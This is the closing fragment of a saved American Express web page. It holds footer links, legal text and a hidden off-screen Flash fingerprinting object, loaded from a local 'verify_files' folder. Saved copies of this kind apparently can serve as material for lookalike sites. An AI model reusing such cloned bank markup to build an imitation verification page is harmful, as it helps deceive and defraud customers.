class="iNDef" id="gNFtLC7"><a id="footer_credit_basics" href="" title="">Financial Education</a></li><li class="iNDef iNavLast" id="gNFtLC8"><a id="footer_servicemember_benefits" href="https://www.americanexpress.com/us/content/help/service-members-civil-relief.html?inav=footer_servicemember_benefits" title="">Servicemember Benefits</a></li></ul><p class="iNLegal">All users of our online services subject to Privacy Statement and agree to be bound by Terms of Service. Please review.</p><p class="iNCopy">? 2018 American Express Company. All rights reserved.</p></div></div><div for="-203843340" id="iNavObjects"></div><div for="-894311434" id="iNavScripts"></div></div></div>
	

			</div>
		</div> 
   
   <link href="./verify_files/aaLauncher.css" type="text/css" media="all" rel="stylesheet"><object type="application/x-shockwave-flash" id="cc_swf" data="./verify_files/s.swf.download" style="position: absolute; top: -9999px; left: -9999px;" width="1" height="1"><param name="allowScriptAccess" value="always"><param flashvars="t=06c1c349-9133-4569-8952-a09325491c39&amp;cm=507899&amp;sid=ee490b8fb9a4d570&amp;tid=USFUIDFYP68e62437-9064-4c43-8ab&amp;clientName=NoClientName"></object><div for="-144395614" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div></body></html>